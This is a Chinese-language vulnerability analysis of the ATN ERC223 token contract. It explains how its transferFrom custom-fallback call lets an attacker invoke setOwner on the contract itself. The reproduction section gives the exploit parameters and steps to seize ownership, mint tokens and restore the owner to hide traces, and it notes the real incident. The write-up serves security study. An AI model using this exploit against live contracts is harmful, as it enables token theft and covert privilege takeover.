        function transferFrom(address src, address dst, uint wad)
            public
            stoppable
            returns (bool)
        {
            if (src != msg.sender && !_trusted[src][msg.sender]) {
                _approvals[src][msg.sender] = sub(_approvals[src][msg.sender], wad);
            }
            _balances[src] = sub(_balances[src], wad);
            _balances[dst] = add(_balances[dst], wad);
            Transfer(src, dst, wad);
            return true;
        }
        function push(address dst, uint wad) public {
            transferFrom(msg.sender, dst, wad);
        }
        function pull(address src, uint wad) public {
            transferFrom(src, msg.sender, wad);
        }
        function move(address src, address dst, uint wad) public {
            transferFrom(src, dst, wad);
        }
        function mint(uint wad) public {
            mint(msg.sender, wad);
        }
        function burn(uint wad) public {
            burn(msg.sender, wad);
        }
        function mint(address guy, uint wad) public auth stoppable {
            _balances[guy] = add(_balances[guy], wad);
            _supply = add(_supply, wad);
            Mint(guy, wad);
        }
        function burn(address guy, uint wad) public auth stoppable {
            if (guy != msg.sender && !_trusted[guy][msg.sender]) {
                _approvals[guy][msg.sender] = sub(_approvals[guy][msg.sender], wad);
            }
            _balances[guy] = sub(_balances[guy], wad);
            _supply = sub(_supply, wad);
            Burn(guy, wad);
        }
        // Optional token name
        bytes32   public  name = "";
        function setName(bytes32 name_) public auth {
            name = name_;
        }
    }
`DSToken`继承了上文的合约以及用于停止合约运行的`DSStop`合约。
比较值得注意的地方为`_trusted`。此函数类似于记录授权值，只有被授权后的用户才能代替进行转账操作。并且此授权值有固定的金额。
而`mint`函数也是此合约的重点。该函数用于增加某地址的金额数量，而想要执行此函数，必须经过授权或者拥有权限。
之后合约定义了`Controlled`。
    contract Controlled {
        /// @notice The address of the controller is the only address that can call
        ///  a function with this modifier
        modifier onlyController { if (msg.sender != controller) throw; _; }
        address public controller;
        function Controlled() { controller = msg.sender;}
        /// @notice Changes the controller of the contract
        /// @param _newController The new controller of the contract
        function changeController(address _newController) onlyController {
            controller = _newController;
        }
    }
此合约用于进行权限的判断并进行对`controller`的修改。
而下面就是我们ATN合约的具体函数内容了。
ATN合约定义了多个类型的转账函数，其名字均相同，但是传入参数不同（便于参与者定制）。
    function transferFrom(address _from, address _to, uint256 _amount
        ) public returns (bool success) {
            // Alerts the token controller of the transfer
            if (isContract(controller)) {
                if (!TokenController(controller).onTransfer(_from, _to, _amount))
                   throw;
            }
            success = super.transferFrom(_from, _to, _amount);
            if (success && isContract(_to))
            {
                // ERC20 backward compatiability
                if(!_to.call(bytes4(keccak256("tokenFallback(address,uint256)")), _from, _amount)) {
                    // do nothing when error in call in case that the _to contract is not inherited from ERC223ReceivingContract
                    // revert();
                    // bytes memory empty;
                    ReceivingContractTokenFallbackFailed(_from, _to, _amount);
                    // Even the fallback failed if there is such one, the transfer will not be revert since "revert()" is not called.
                }
            }
        }
我们挑选其中一个进行详细讲解。
    function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback)
            public
            returns (bool success)
        {
            // Alerts the token controller of the transfer
            if (isContract(controller)) {
                if (!TokenController(controller).onTransfer(_from, _to, _amount))
                   throw;
            }
            require(super.transferFrom(_from, _to, _amount));
            if (isContract(_to)) {
                ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
                receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);
            }
            ERC223Transfer(_from, _to, _amount, _data);
            return true;
        }
在该合约中，我们知道函数首先判断`controller`是否为一个合约而不是一个钱包地址。如何为合约的话，那么将调用`TokenController`中的`onTransfer`函数。
然而这并不是重点，之后将使用`require(super.transferFrom(_from, _to,
_amount));`函数进行转账操作，此处使用了继承的方法进行转账，并使用`require`进行对转账成功与否进行判断。只有成功才能继续进行。而后，我们将对`_to`地址进行判断，若此地址为合约，那么我们将调用`receiver.call.value(0)(bytes4(keccak256(_custom_fallback)),
_from, _amount,
_data);`。而领我们疑问的是为什么次函数会调用receiver的内部函数呢？我们在这里理解为：`ERC20Token与ERC20Token之间的直接互换。本质上是发送ATN时，通过回调函数执行额外指令，比如发回其他Token。`也就是说我们在进行了转账操作后可以传入指令自动执行地址下的函数，方便我们进行连续操作。（出发点很好，但是因为此而存在了漏洞）
而后是判定是否为合约的函数。
    function isContract(address _addr) constant internal returns(bool) {
            uint size;
            if (_addr == 0) return false;
            assembly {
                size := extcodesize(_addr)
            }
            return size>0;
        }
而为了保证安全性，合约还定义了转账函数以降低风险。
    /// @notice This method can be used by the controller to extract mistakenly
        ///  sent tokens to this contract.
        /// @param _token The address of the token contract that you want to recover
        ///  set to 0 in case you want to extract ether.
        function claimTokens(address _token) onlyController {
            if (_token == 0x0) {
                controller.transfer(this.balance);
                return;
            }
            ERC20 token = ERC20(_token);
            uint balance = token.balanceOf(this);
            token.transfer(controller, balance);
            ClaimedTokens(_token, controller, balance);
        }
这里定义了`claimTokens`合约用于将余额全部提取以防止出现大的安全隐患。
### 三、漏洞复现
根据我们上文解释，我们能够发现在ATN合约中的转账函数多次出现了远程调用的内容。这其实是很危险的行为。通常当我们调用 ERC20 的
`approve()`函数给一个智能合约地址后，对方并不能收到相关通知进行下一步操作，常见做法是利用
接收通知调用（receiverCall）来解决无法监听的问题。上面代码是一种实现方式，很不幸这段代码有严重的 `CUSTOM_CALL`
滥用漏洞。调用`approveAndCall()`函数后，会接着执行`_spender`上用户自定义的其他方法来进行接收者的后续操作。
所以我们完全可以在`transferFrom`函数中传入特定的参数从而执行特定的函数。
    function transferFrom(address _from, address _to, uint256 _amount,
    bytes _data, string _custom_fallback) public returns (bool success)
    {
    ERC223ReceivingContract receiver =
    ERC223ReceivingContract(_to);
    receiving.call.value(0)(byte4(keccak256(_custom_fallback)),
    _from, amout, data);
    }
比如我们可以传入：
    transferFrom( hacker_address, atn_contract_address, 0, 0,
    "setOwner(address)")
    _from: 0xxxxxxxx-- 黑客地址
    _to: 0xxxxxxx -- ATN合约地址
    _amount: 0
    _data: 0x0
    _custom_fallback: setOwner(address)
这样函数就会在执行转账操作后执行`setOwner`函数。此时 `setOwner`会先验证 `auth` 合法性的，而 `msg.sender`
就是ATN的合约地址。此时黑客将 ATN Token合约的 owner 变更为自己控制的地址。
首先我们需要部署合约。
之后调用mint函数进行挖矿向合约中注入一定资产。
进行查看。
此时我们创建攻击者账户。并查看其余额，查看当前owner。
之后我们切换到攻击者账户下，并传入参数：
`"0x14723a09acff6d2a60dcdf7aa4aff308fddc160c","0xca35b7d915458ef540ade6068dfe2f44e8fa733c",0,0x00,"setOwner(address)"`
传入后，我们再次查看`owner`的信息。
却发现失败了。仔细阅读后发现我们需要将令`_to`为一个合约地址。
`"0x14723a09acff6d2a60dcdf7aa4aff308fddc160c","0xbbf289d846208c16edc8474705c748aff07732db",0,0x00,"setOwner(address)"`
更换地址后，我们执行。得到如下结果。
此时我们能够看到 `owner`已经更换。
既然我们已经成为合约拥有者，那么我们就给自己点福利。
我们成功给自己的账户中增加了一定的token。
之后我们为了销声匿迹。将合约主人换回从前。
至此，我们的攻击目的已经达到。
在真实ATN中，我们能够查询到真实攻击的交易情况：
  1. 黑客获得提权，将自己的地址设为owner  
  2. 黑客在获得owner权限后，发行1100w ATN到自己的攻击主地址  
  3. 黑客将owner设置恢复，企图隐藏踪迹  
### 四、参考链接
  * 
  * 
  * 
  * 
  * 
**本稿为原创稿件，转载请标明出处。谢谢。**